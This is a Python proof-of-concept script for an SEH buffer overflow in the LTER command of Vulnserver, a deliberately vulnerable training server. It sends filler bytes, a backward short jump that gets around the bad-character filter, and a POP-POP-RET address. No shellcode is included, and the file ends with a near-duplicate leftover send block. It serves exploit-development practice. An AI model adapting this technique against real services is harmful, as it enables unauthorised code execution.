#########################################################################################
# Title: Vulnserver LTER command SEH exploit
# Author: Marco Lugo
# Description: execute first stage -> payload jump backwards. Normally this would not be
#              possible since it would need \x74\x80-xFF but since 0x7F gets substracted
#              \x74\xFF becomes \x74\x80, allowing us to jump back. A jump forward (\x74\x06)
#              would only allow for 28 bytes which with the bad character restrictions make
#              anything impossible. The backward jump gives us more freedom at 126 bytes.
#
#              To get Stephen Bradshaw's Vulnserver, visit:
#              http://www.thegreycorner.com/2010/12/introducing-vulnserver.html
#########################################################################################

import socket
import sys
import os
import struct

pop_pop_ret = struct.pack('<I', 0x6250172B)
first_stage = '\x74\xFF\x41\x41'

target_ip = sys.argv[1]
buffer = 'LTER /.:/' 
pattern = '\x41'*1999 + '\x42'*1496 + first_stage + pop_pop_ret + '\x43'*1697
buffer += pattern

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target_ip, 9999))
sock.recv(1024)
sock.send(buffer)
sock.close()


target_ip = sys.argv[1]
buffer = 'LTER /.:/' 
pattern = '\x41'*1999 + '\x44'*1500 + pop_pop_ret + '\x43'*1697
buffer += pattern

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target_ip, 9999))
sock.recv(1024)
sock.send(buffer)
sock.close()

